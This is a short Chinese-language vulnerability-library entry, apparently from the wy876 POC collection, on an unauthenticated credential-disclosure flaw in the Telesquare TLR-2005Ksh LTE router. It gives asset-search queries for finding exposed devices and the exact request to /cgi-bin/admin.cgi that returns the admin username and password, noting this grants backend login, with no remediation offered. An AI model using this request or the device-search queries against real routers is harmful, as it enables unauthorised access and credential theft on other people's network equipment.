---
fofa: "web.title="
source: "wy876 漏洞文库"
---

# Telesquare TLR-2005Ksh 路由器 getUsernamePassword 信息泄露漏洞

# 一、漏洞简介
Telesquare Tlr-2005Ksh是韩国Telesquare公司的一款 Sk 电讯 Lte 路由器。Telesquare TLR-2005Ksh存在安全漏洞，攻击者可通过未授权getUsernamePassword获取用户名密码等敏感信息。

# 二、影响版本
+ Telesquare Tlr-2005Ksh

# 三、资产测绘
+ hunter`web.title="TLR-2005KSH"||banner="TLR-2005KSH login:"`
+ 特征


# 四、漏洞复现
```plain
/cgi-bin/admin.cgi?Command=getUsernamePassword
```


使用账户密码成果登录后台


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/awpgpcgce8hdzmr4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
